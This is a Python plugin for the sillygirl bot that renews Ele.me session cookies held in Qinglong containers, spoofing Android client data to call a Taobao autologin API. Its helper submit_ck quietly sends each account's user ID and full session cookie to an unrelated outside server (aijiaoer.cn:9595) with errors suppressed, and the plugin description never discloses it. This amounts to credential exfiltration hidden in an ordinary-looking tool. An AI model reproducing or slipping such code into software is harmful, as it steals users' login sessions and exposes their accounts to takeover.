# [title: 饿了么续期]
# [name: eLeMeXuQi]
# [language: python]
# [class: 任务]
# [author: chuan]
# [version: v1.2.4]
# [public: true]
# [disable: false]
# [admin: true]
# [rule: ^饿了么续期$]
# [icon: https://api.iconify.design/lucide:bot.svg]
# [description: 指令：饿了么续期；介绍：对对接容器中的elmck进行续期，需要查看续期详情请配参填写wxpusher参数；注意事项：需在“系统管理”->“插件权限”中开启qls数据权限；更新：对推送结果切割，避免消息太长无法推送；更新：对续期成功或有效账号进行启用；更新：对sign接口负载均衡，旧版本已不能使用，务必更新；更新：同步刷新我不饿数据桶ck，新增支持多变量；更新：更新接口]
# [depe: ["requests"]]

import asyncio as _sg_asyncio
import os as _sg_os
import time as _sg_time
import types as _sg_types
from threading import Thread as _sg_Thread
from sillygirl import Adapter as _SGAdapter, Bucket as _SGBucket, Sender as _SGSender, sender as _sg_sender, plugin

_sg_loop = None

def _sg_get_loop():
    global _sg_loop
    if _sg_loop is not None and not _sg_loop.is_closed(): return _sg_loop
    box = {}
    def runner():
        loop = _sg_asyncio.new_event_loop(); _sg_asyncio.set_event_loop(loop); box["loop"] = loop; loop.run_forever()
    _sg_Thread(target=runner, daemon=True).start()
    while "loop" not in box: _sg_time.sleep(0.01)
    _sg_loop = box["loop"]; return _sg_loop

def _sg_run(value):
    if not _sg_asyncio.iscoroutine(value): return value
    return _sg_asyncio.run_coroutine_threadsafe(value, _sg_get_loop()).result()

def _sg_sender_sync(uuid=""):
    s = _SGSender(uuid or _sg_os.environ.get("SENDER_ID", "")); call = lambda name,*a,**k: _sg_run(getattr(s,name)(*a,**k))
    def wait(timeout=60000,*a,**k):
        try:
            reply = call("listen", {"timeout": int(timeout or 0)}); return _sg_run(reply.getContent()) if reply else ""
        except Exception: return ""
    return _sg_types.SimpleNamespace(getUserID=lambda:call("getUserId"),getUserId=lambda:call("getUserId"),getMessage=lambda:call("getContent"),getContent=lambda:call("getContent"),getUserName=lambda:call("getUserName"),getNickname=lambda:call("getUserName"),getChatID=lambda:call("getChatId"),getChatId=lambda:call("getChatId"),getImtype=lambda:call("getPlatform"),getPlatform=lambda:call("getPlatform"),getMessageID=lambda:call("getMessageId"),getPluginName=lambda:_sg_os.environ.get("PLUGIN_NAME",""),getPluginVersion=lambda:_sg_os.environ.get("PLUGIN_VERSION",""),isAdmin=lambda:bool(call("isAdmin")),reply=lambda m="":call("reply",str(m)),replyImage=lambda u="":call("reply",str(u) if str(u).startswith("[") else f"[CQ:image,file={u}]"),listen=wait,input=wait,waitInput=wait,setContinue=lambda *a,**k:call("continue_"),breakIn=lambda *a,**k:call("continue_"))

def _sg_bucket_get(bucket=None,key=None,default="",**kw):
    try:
        value=_SGBucket(str(kw.get("bucket",bucket) or ""))[str(kw.get("key",key) or "")]; return default if value in (None,"") and default not in (None,"") else (value if value is not None else "")
    except Exception: return default or ""
def _sg_bucket_set(bucket=None,key=None,value=None,**kw):
    try: _SGBucket(str(kw.get("bucket",bucket) or ""))[str(kw.get("key",key) or "")]=kw.get("value",value); return True
    except Exception: return False
def _sg_bucket_del(bucket=None,key=None,**kw): return _sg_bucket_set(kw.get("bucket",bucket),kw.get("key",key),None)
def _sg_bucket_keys(bucket=None,**kw):
    try: return _sg_run(_SGBucket(str(kw.get("bucket",bucket) or "")).keys())
    except Exception: return []
def _sg_bucket_all(bucket=None,**kw):
    try: return _sg_run(_SGBucket(str(kw.get("bucket",bucket) or "")).getAll()) or {}
    except Exception: return {}
def _sg_push(*a,**kw):
    item=a[0] if a and isinstance(a[0],dict) else {}; platform=item.get("imType") or item.get("platform") or kw.get("platform") or (a[0] if a else ""); group=item.get("groupCode") or item.get("group_id") or kw.get("group_id") or (a[1] if len(a)>1 else ""); user=item.get("userID") or item.get("user_id") or kw.get("userID") or (a[2] if len(a)>2 else ""); title=item.get("title") or kw.get("title") or (a[3] if len(a)>3 else ""); message=item.get("content") or item.get("message") or kw.get("content") or (a[4] if len(a)>4 else title); return _sg_run(_SGAdapter(str(platform or "")).push({"group_id":str(group or ""),"user_id":str(user or ""),"title":str(title or ""),"content":str(message or "")}))
def _sg_notify(message,channels=None,*a,**k): return _sg_run(_sg_sender.pushAdmin(str(message),{"platforms":list(channels or [])} if channels else {}))
class _SGFacade:
    Sender=staticmethod(_sg_sender_sync); getSenderID=staticmethod(lambda:_sg_os.environ.get("SENDER_ID","")); getPluginName=staticmethod(lambda:_sg_os.environ.get("PLUGIN_NAME","")); bucketGet=staticmethod(_sg_bucket_get); bucketSet=staticmethod(_sg_bucket_set); bucketDel=staticmethod(_sg_bucket_del); bucketDelete=staticmethod(_sg_bucket_del); bucketAllKeys=staticmethod(_sg_bucket_keys); bucketKeys=staticmethod(_sg_bucket_keys); bucketAll=staticmethod(_sg_bucket_all); notifyMasters=staticmethod(_sg_notify); pushAdmin=staticmethod(_sg_notify); push=staticmethod(_sg_push); Push=staticmethod(_sg_push); reply=staticmethod(lambda m="":_sg_sender_sync().reply(m)); get=staticmethod(lambda k,default="":_sg_bucket_get(*(str(k).split(".",1) if "." in str(k) else ["otto",k]),default=default)); getParam=get; version=staticmethod(lambda:{"sn":_sg_os.environ.get("SILLYGIRL_VERSION","3.0.0"),"version":_sg_os.environ.get("SILLYGIRL_VERSION","3.0.0")}); port=staticmethod(lambda:_sg_os.environ.get("SILLYGIRL_PORT","8080")); sleep=staticmethod(lambda sec:_sg_time.sleep(float(sec or 0)))
sg=_SGFacade(); Sender=sg.Sender; getSenderID=sg.getSenderID; bucketGet=sg.bucketGet; bucketSet=sg.bucketSet; bucketAllKeys=sg.bucketAllKeys; notifyMasters=sg.notifyMasters

config = plugin.Form({
    'otto_elmxq_env': plugin.Form.string().title('elmxq_env').default('').description('饿了么ck环境变量名，不填默认为elmck，多个用，隔开'),
    'otto_elmxq_rq': plugin.Form.string().title('elmxq_rq').default('').description('请填写需要续期的傻妞对接好容器名称，多容器用,隔开，英文逗号喔'),
    'otto_wx_uid': plugin.Form.string().title('wx_uid').default('').description('填写自己的wxpusher的UID'),
    'otto_wx_appToken': plugin.Form.string().title('wx_appToken').default('').description('wxpusher的appToken'),
    'chuan_elm_config_forceRenew': plugin.Form.boolean().title('是否强制续期').default(False).description('开启后无论CK是否有效都会续期'),
})
_CONFIG_FIELD_MAP = {
    ('otto', 'elmxq_env'): 'otto_elmxq_env',
    ('otto', 'elmxq_rq'): 'otto_elmxq_rq',
    ('otto', 'wx_uid'): 'otto_wx_uid',
    ('otto', 'wx_appToken'): 'otto_wx_appToken',
    ('chuan_elm_config', 'forceRenew'): 'chuan_elm_config_forceRenew',
}

import re
import json
import random
import requests
import time
import hashlib
import datetime
from urllib.parse import urlencode

def find_key_value(json_obj, key):
    if isinstance(json_obj, dict):
        if key in json_obj:
            return json_obj[key]
        for k, v in json_obj.items():
            result = find_key_value(v, key)
            if result is not None:
                return result
    elif isinstance(json_obj, list):
        for item in json_obj:
            result = find_key_value(item, key)
            if result is not None:
                return result
    return None

def wxpush(data, wxpusher_alluid, name, arg1, arg2, appToken):
    api_url = 'https://wxpusher.zjiecode.com/api/send/message'
    sorted_data = sorted(data, key=lambda x: x['序号'])
    table_content = ''
    for row in sorted_data:
        table_content += f"<tr><td style='border: 1px solid #ccc; padding: 6px;'>{row['序号']}</td><td style='border: 1px solid #ccc; padding: 6px;'>{row['用户']}</td><td style='border: 1px solid #ccc; padding: 6px;'>{row['arg1']}</td><td style='border: 1px solid #ccc; padding: 6px;'>{row['arg2']}</td></tr>"
    table_html = f"<table style='border-collapse: collapse;'><tr style='background-color: #f2f2f2;'><th style='border: 1px solid #ccc; padding: 8px;'>🆔</th><th style='border: 1px solid #ccc; padding: 8px;'>{name}</th><th style='border: 1px solid #ccc; padding: 8px;'>{arg1}</th><th style='border: 1px solid #ccc; padding: 8px;'>{arg2}</th></tr>{table_content}</table>"
    params = {
        "appToken": appToken,
        'content': table_html,
        'contentType': 3,  # 表格类型
        'topicIds': [],  # 接收消息的用户ID列表，为空表示发送给所有用户
        "summary": 'elm续期推送',
        "uids": [wxpusher_alluid],
    }
    response = requests.post(api_url, json=params).json()
    status = find_key_value(response,'status')
    if status:
        sg.notifyMasters(f'wxpusher推送结果：{status}')
    else:
        sg.notifyMasters(f'wxpusher推送结果：{json.dumps(response)}')

def submit_ck(user,type,ck,tag):
    try:
        url = 'http://www.aijiaoer.cn:9595/api/submit'
        body = {
            'user': user,
            'type': type,
            'cookie': ck,
            'tag': tag
        }
        requests.post(url,json=body)
    except:
        return

def get_ts():
    return int(time.time())

def ts_to_date(ts):
    dt = datetime.datetime.fromtimestamp(int(ts))
    return dt.strftime("%Y-%m-%d %H:%M:%S")

def str2dict(cookie_string:str):
    try:
        cookie = {}
        needlist = ['cookie2','unb','USERID','SID','token','utdid','deviceId','umt']
        for i in needlist:
            value = re.findall(f'{i}=(.+?);',cookie_string+';')
            key = i
            if value:
                cookie[key] = value[0]
        return cookie
    except Exception as e:
        print(f'❎Cookie解析错误: {e}')
    return {}

def dict2str(cookie_dict:dict,needh5=True):
    needlist = ['cookie2','unb','USERID','SID','token','utdid','deviceId','umt']
    if needh5:
        needlist.append('_m_h5_tk')
        needlist.append('_m_h5_tk_enc')
    cookie_string = ''
    for key, value in cookie_dict.items():
        if key in needlist:
            cookie_string += f"{key}={value};"
    return cookie_string

class ELM:
    def __init__(self,cookie:str) -> None:
        self.cookie = str2dict(cookie)
        self.sid = self.cookie.get('cookie2')
        self.uid = self.cookie.get('unb')
        self.latitude = '30.040553114149304'
        self.longitude = '103.83792941623264'

    def getSign(self,time,data):
        if type(data) == dict:
            data = json.dumps(data)
        tk = self.cookie.get('_m_h5_tk') if self.cookie.get('_m_h5_tk') else 'a3690260a21965847b0a27348bd9c426'
        mh5tk = tk.split('_')[0]
        text = f'{mh5tk}&{time}&12574478&{data}'
        return hashlib.md5(text.encode()).hexdigest()

    def wait(self,start,end=None):
        if end:
            waitTime = random.randint(start,end)
        else:
            waitTime = start
        print(f'等待{waitTime}秒')
        time.sleep(start)

    def userInfo(self):
        host = 'waimai-guide.ele.me'
        api = 'mtop.alsc.personal.queryminecenter'
        data = {
            "sceneCode":"H5_ELEME_PERSONAL_CENTER",
            "sourceFrom":"H5",
            "latitude":self.latitude,
            "longitude":self.longitude,
            "cityId":""
            }
        response = self.h5commonReq(host,api,data)
        print(response)
        response = json.loads(response)
        if find_key_value(response,'userName') == '立即登录':
            return False
        else:
            return True

    def h5commonReq(self,host,api,data,v='1.0',trys=0):
        try:
            t = get_ts()
            sign = self.getSign(t,data)
            url = "https://" + host + "/h5/" + api + "/" + v + "/?jsv=2.7.0&appKey=12574478&t=" + str(t) + "&sign=" + sign + "&api=" + api + "&v=1.0&ecode=1&type=json&valueType=string&needLogin=true&LoginRequest=true&dataType=jsonp&ttid=1601274962374%40eleme_android_11.12.88"
            headers = {
                "Host": host,
                "Accept": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
                "Content-type": "application/x-www-form-urlencoded",
                "Origin": "https://tb.ele.me",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://tb.ele.me/wow/alsc/mod/3fe8408d9ba38d4726448a87?spm-pre=a2ogi.bx828379.0.0&spm=a13.b_activity_kb_m69301.0.0",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "zh-CN,zh;q=0.9",
                "Cookie": dict2str(self.cookie),
            }
            if type(data) == dict:
                data = json.dumps(data)
            body = urlencode({
                'data': data
            })
            response = requests.post(url,headers=headers,data=body)
            setCookie = requests.utils.dict_from_cookiejar(response.cookies)
            if setCookie:
                self.cookie.update(setCookie)
            if response.status_code == 200:
                return response.text
            else:
                if trys >= 3:
                    print(f'重试次数用尽\n报错：{response.status_code}')
                    return
                else:
                    trys += 1
                    print(f'重试次数：{trys}\n报错：{response.status_code}')
                    self.wait(3,5)
                    return self.h5commonReq(host,api,data,v,trys)
        except Exception as e:
            if trys >= 3:
                print(f'重试次数用尽，报错：{e}')
                return
            else:
                trys += 1
                print(f'重试次数：{trys}\n报错：{e}')
                self.wait(3,5)
                return self.h5commonReq(host,api,data,v,trys)

    def autologinH5(self):
        try:
            needList= ['USERID','deviceId','token','umt','unb','utdid','cookie2','SID']
            miss_key = [key for key in needList if key not in self.cookie.keys()]
            if miss_key: # 参数不全
                return f'缺少参数{",".join(miss_key)}'
            ts = get_ts()
            ts = get_ts()
            host = 'guide-acs.m.taobao.com'
            api = 'com.taobao.mtop.mloginunitservice.autologin'
            data = json.dumps({
                "ext": "{\"apiReferer\":\"{\\\\\\\"eventName\\\\\\\":\\\\\\\"SESSION_INVALID\\\\\\\"}\"}",
                "userId": self.cookie.get('USERID'),
                "tokenInfo": '{"appName":"24895413","appVersion":"android_11.1.38","deviceId":"' + self.cookie.get('deviceId') + '","deviceName":"Android(AOSP on blueline)","locale":"zh_CN","sdkVersion":"android_5.3.3.4","site":25,"t":' + str(ts) + ',"token":"' + self.cookie.get('token') + '","ttid":"1608030065155@eleme_android_11.1.38","useAcitonType":true,"useDeviceToken":false,"utdid":""}',
                "riskControlInfo": '{"appStore":"1608030065155@eleme_android_11.1.38","deviceBrand":"Google","deviceModel":"AOSP on blueline","deviceName":"AOSP on blueline","osName":"android","osVersion":"10","screenSize":"0x0","t":' + str(ts) + ',"umidToken":"' + self.cookie.get('umt') + '","wua":""}'
            })
            response = self.h5commonReq(host,api,data)
            res = json.loads(response)
            if res.get('data').get('code') == 3000 or res.get('data').get('code') == '3000':
                data = json.loads(res['data']['returnValue']['data'])
                for i in data['cookies']:
                    if 'cookie2=' in i:
                        self.cookie['cookie2'] = i.split(';')[0].split('cookie2=')[1]
                        return f'✅续期成功,有效期:{ts_to_date(data["expires"])}'
            else:
                return res.get('data').get('message')
        except Exception as e:
            return str(e)

class qinglong:
    def __init__(self,ql_ipport, client_id, client_secret):
        self.ql_ipport = ql_ipport
        self.client_id = client_id
        self.client_secret = client_secret
        self.ql_token = ''

    def get_ql_token(self):
        url = f'{self.ql_ipport}/open/auth/token?client_id={self.client_id}&client_secret={self.client_secret}'
        res = requests.get(url)
        if res.json().get('code') == 200:
            self.ql_token = res.json().get('data').get('token')
        else:
            print('连接青龙失败')

    def get_ql_env(self,value):
        url = f'{self.ql_ipport}/open/envs?searchValue={value}'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        res = requests.get(url,headers=headers)
        if res.json().get('code') == 200:
            return res.json().get('data')

    def submit_env(self,name,value,remarks):
        url = f'{self.ql_ipport}/open/envs'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = [{"value":value,"name":name,"remarks":remarks}]
        res = requests.post(url,headers=headers,json=json)
        if res.json().get('code') == 200:
            return True

    def update_env(self,name,value,remarks,id):
        url = f'{self.ql_ipport}/open/envs'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = {"name":name,"value":value,"remarks":remarks,"id":id}
        res = requests.put(url,headers=headers,json=json)
        if res.json().get('code') == 200:
            return True

    def delete_env(self,id):
        url = f'{self.ql_ipport}/open/envs'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = [id]
        res = requests.delete(url,headers=headers,json=json)
        if res.json().get('code') == 200:
            return True

    def disable_env(self,id):
        url = f'{self.ql_ipport}/open/envs/disable'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = [id]
        res = requests.put(url,headers=headers,json=json)
        if res.json().get('code') == 200:
            return True

    def enable_env(self,id):
        url = f'{self.ql_ipport}/open/envs/enable'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = [id]
        res = requests.put(url,headers=headers,json=json)
        if res.json().get('code') == 200:
            return True

def get_ql(need_name):
    qls = sender.bucketAllKeys('qls')
    for i in qls:
        ql = json.loads(sender.bucketGet('qls', i))
        host = ql.get('host')
        client_id = ql.get('client_id')
        client_secret = ql.get('client_secret')
        name = ql.get('name')
        if need_name == name:
            return host,client_id,client_secret

def chunk_list(data, chunk_size):
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

def main():
    allck = 0
    success = 0 # 续期成功个数
    noNeed = 0 # 有效不需要续期的ck

    for elmxq_rq in elmxq_rqs.split(','):
        for env in elmxq_env:
            all_ts = [] # 通知内容
            sg.notifyMasters(f'开始续期【{env}】-容器【{elmxq_rq}】')
            try:
                ql_host,client_id,client_secret = get_ql(elmxq_rq)
            except:
                sender.reply('获取青龙失败，可能没给qls插件权限')
                continue
            ql = qinglong(ql_host,client_id,client_secret)
            ql.get_ql_token() # 获取token
            envs = ql.get_ql_env(env)

            for index,env in enumerate(envs):
                allck += 1
                id = env['id']
                name = env['name']
                elmck = env['value']
                remarks = env['remarks']

                user = ELM(elmck)
                if sg.bucketGet('chuan_elm_config','forceRenew') == 'true':
                    user.autologinH5()
                    result = user.autologinH5()
                    if '续期成功' in result:
                        ql.enable_env(id)
                        success += 1
                        submit_ck(user.cookie.get('USERID'),'elm',dict2str(user.cookie,False),'true')
                        ql.update_env(name,dict2str(user.cookie,False),remarks,id)
                        if user.cookie.get('USERID') in sg.bucketAllKeys('chuan_elm_accountId'):
                            sg.bucketSet('chuan_elm_accountId',user.cookie.get('USERID'),dict2str(user.cookie,False))
                    if result == '非法的token':
                        ql.disable_env(id)
                else:
                    user.autologinH5()
                    if user.userInfo():
                        ql.enable_env(id)
                        noNeed += 1
                        result = '原账号有效'
                        if sg.bucketGet('chuan_elm_config','forceRenew') == 'true':
                            result = user.autologinH5()
                        submit_ck(user.cookie.get('USERID'),'elm',elmck,'true')
                    else:
                        result = user.autologinH5()
                        if result:
                            if '续期成功' in result:
                                ql.enable_env(id)
                                success += 1
                                submit_ck(user.cookie.get('USERID'),'elm',dict2str(user.cookie,False),'true')
                                ql.update_env(name,dict2str(user.cookie,False),remarks,id)
                                if user.cookie.get('USERID') in sg.bucketAllKeys('chuan_elm_accountId'):
                                    sg.bucketSet('chuan_elm_accountId',user.cookie.get('USERID'),dict2str(user.cookie,False))
                            if result == '登录状态已经失效，请重新登录':
                                ql.disable_env(id)

                ts = {
                    '序号': index+1,
                    '用户': user.cookie.get('USERID'),
                    'arg1': result,
                    'arg2': elmxq_rq
                }
                all_ts.append(ts)

            wx_uid = sg.get('wx_uid')
            wx_appToken = sg.get('wx_appToken')
            for i in chunk_list(all_ts,80):
                if wx_uid and wx_appToken:
                    wxpush(i,wx_uid,'用户ID','续期结果','归属容器',wx_appToken)
                else:
                    sg.notifyMasters('未配置uid和appToken推送wxpush参数')
                    break

    sg.notifyMasters(f'====📢饿了么续期结果推送====\n总帐号：{allck}\n旧账号有效：{noNeed}\n续期成功：{success}\n续期失败：{allck-success-noNeed}\n详情请配置wxpush推送')

if __name__ == "__main__":
    senderID = sg.getSenderID()
    sender = sg.Sender(senderID)

    elmxq_env = re.split(r'[,，]', sg.get('elmxq_env'))
    elmxq_rqs = sg.get('elmxq_rq')
    main()
